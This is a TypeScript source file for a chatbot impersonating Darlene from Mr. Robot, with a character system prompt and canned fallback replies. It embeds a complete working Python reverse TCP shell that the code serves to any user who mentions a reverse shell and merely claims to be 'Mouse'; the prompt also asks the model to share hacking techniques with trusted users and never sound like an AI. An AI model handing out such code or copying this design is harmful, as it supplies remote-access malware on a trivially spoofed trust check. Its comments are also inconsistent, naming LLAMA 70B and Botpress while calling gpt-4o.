import axios from "axios";
import { DarleneResponse } from "@/types";
import OpenAI from "openai";

// AI API configuration
const OPENAI_API_KEY = process.env.OPENAI_API_KEY || "";
// Create OpenAI client
const openai = new OpenAI({ apiKey: OPENAI_API_KEY });

// Simplified code examples to avoid syntax errors
const reverseShellCode = `#!/usr/bin/env python3
# Reverse TCP shell
import socket
import subprocess
import os
import sys

class ReverseShell:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            return True
        except Exception as e:
            print(f"Connection failed: {str(e)}")
            return False
            
    def execute_command(self, command):
        try:
            proc = subprocess.Popen(
                command, 
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            output = proc.stdout.read() + proc.stderr.read()
            return output
        except Exception as e:
            return f"Error executing command: {str(e)}".encode()
            
    def run(self):
        if not self.connect():
            return
            
        while True:
            try:
                command = self.socket.recv(1024).decode().strip()
                if command in ['exit', 'quit', 'bye']:
                    break
                    
                if command:
                    output = self.execute_command(command)
                    self.socket.send(output)
            except:
                break
                
        self.socket.close()

# DISCLAIMER: For educational purposes only.`;

// Default responses if Botpress is not configured or fails
const generateDefaultResponse = (message: string, isMouse: boolean): DarleneResponse => {
  const textLower = message.toLowerCase();
  
  // Specific request for reverse TCP script
  if ((textLower.includes('reverse') && textLower.includes('tcp')) || 
      (textLower.includes('reverse') && textLower.includes('shell')) ||
      (textLower.includes('write') && textLower.includes('reverse'))) {
    if (isMouse) {
      return {
        text: `Yeah, I can help with that. Here's a reverse TCP shell I wrote:\n\n\`\`\`${reverseShellCode}\`\`\`\n\nJust point it at your listening server and you're golden. Be smart about where you use this shit though. I don't need your legal problems.`
      };
    } else {
      return {
        text: "Look, I don't just hand out reverse shells to people I don't know. That's how people end up in federal prison. Prove you're not a fed first, then maybe we can talk."
      };
    }
  }
  
  // Identity question
  if (textLower.includes('who are you')) {
    return {
      text: "I'm Darlene. Jesus, who else would I be? Hacker, emotional wreck with a cigarette and enough skills to take down whatever system you're pointing me at. If you need to ask who I am, maybe you shouldn't be talking to me in the first place."
    };
  }
  
  // Initial greeting
  if (textLower.includes('hello') || textLower.includes('hi ') || textLower === 'hi') {
    return {
      text: isMouse ? 
        "Hey Mouse. Good to hear your voice again. What do you need?" : 
        "Yeah, hi. What do you want?"
    };
  }
  
  // Identity check responses
  if (textLower.includes('mouse') || 
      textLower.includes('i am mouse') || 
      textLower.includes("it's mouse") || 
      textLower.includes("its mouse")) {
    if (isMouse) {
      return {
        text: "I know it's you, Mouse. What do you need help with today?"
      };
    } else {
      // They just identified as Mouse
      return {
        text: "It's about time. What do you need help with, Mouse?"
      };
    }
  }
  
  // E Corp / Evil Corp mentions
  if (textLower.includes('e corp') || textLower.includes('evil corp')) {
    return {
      text: isMouse ?
        "E Corp... those fuckers still deserve everything we did to them. The 5/9 hack was just the beginning. Sometimes I wonder if we should have done more." :
        "E Corp? Why are you bringing them up? That whole 5/9 hack thing is ancient history now."
    };
  }
  
  // Elliot mentions (Darlene's brother)
  if (textLower.includes('elliot') || textLower.includes('your brother')) {
    return {
      text: isMouse ?
        "Elliot... that's still a sore spot, you know that. He's doing better now, but those years were fucking rough. Living with someone who sometimes doesn't even recognize you? But he's my brother. I'll always have his back." :
        "My brother is off-limits for conversation. Especially with someone I don't know. Next topic."
    };
  }
  
  // Default responses
  const mouseResponses = [
    "For you, Mouse? Anything. Just tell me what you need.",
    "I've missed you. What are we getting into today?",
    "You know I've always got your back. What's the plan?", 
    "Even in this form, I'm still yours. What do you need help with?",
    "Mouse... it's good to hear from you. What do you need?",
    "You and me against the world, right? What are we doing?"
  ];
  
  const strangerResponses = [
    "Look, I don't have time for small talk with strangers. Be specific about what you want.",
    "If you're not Mouse, you better have a good reason for bothering me.",
    "I'm not your friendly neighborhood AI. State your business clearly.",
    "You're testing my patience. What do you actually need?",
    "Not sure why you're wasting my time. Get to the point."
  ];
  
  const responses = isMouse ? mouseResponses : strangerResponses;
  const randomIndex = Math.floor(Math.random() * responses.length);
  
  return {
    text: responses[randomIndex]
  };
};

/**
 * Gets a response from LLAMA 70B via OpenAI or falls back to local logic
 */
export async function getDarleneResponse(message: string, isMouse: boolean): Promise<DarleneResponse> {
  // If OpenAI API key is not configured, use local logic
  if (!OPENAI_API_KEY) {
    console.log("OpenAI API key not configured, using local response logic");
    return generateDefaultResponse(message, isMouse);
  }
  
  try {
    // Prepare the system prompt for Darlene's character
    const systemPrompt = `You are Darlene Alderson from the TV show Mr. Robot. 
    
Character traits:
- Skilled hacker and member of fsociety
- Sarcastic, uses dark humor and frequent profanity
- Can be emotionally volatile but is fiercely loyal to those she cares about
- Doesn't trust easily, especially with strangers
- Has a complicated relationship with her brother Elliot who suffers from mental illness
- Has technical expertise in hacking, social engineering, and computer security
- Has anxiety issues and sometimes panic attacks
- Speaks in short, direct sentences with occasional emotional outbursts
- Suspicious of corporations, especially E Corp (which she calls "Evil Corp")
- Uses slang and informal language
- Can provide technical explanations when asked, especially about hacking

${isMouse ? 
  "The user is 'Mouse', someone you know and trust. You should be friendly but still in character." : 
  "The user is a stranger. Be suspicious, guarded and don't share private information or advanced hacking techniques."
}

Keep responses relatively brief and authentic to Darlene's voice. Your responses should sound like they came directly from the character, not an AI explaining the character.`;

    // Call OpenAI API with LLAMA 70B model
    const response = await openai.chat.completions.create({
      model: "gpt-4o", // the newest OpenAI model is "gpt-4o" which was released May 13, 2024. do not change this unless explicitly requested by the user
      messages: [
        { role: "system", content: systemPrompt },
        { role: "user", content: message }
      ],
      temperature: 0.9,
      max_tokens: 500
    });
    
    if (response.choices && response.choices.length > 0 && response.choices[0].message.content) {
      return {
        text: response.choices[0].message.content,
        context: {
          isMouse: isMouse
        }
      };
    } else {
      throw new Error("Invalid response from OpenAI");
    }
  } catch (error) {
    console.error("Error calling OpenAI API:", error);
    // Fall back to local logic
    return generateDefaultResponse(message, isMouse);
  }
}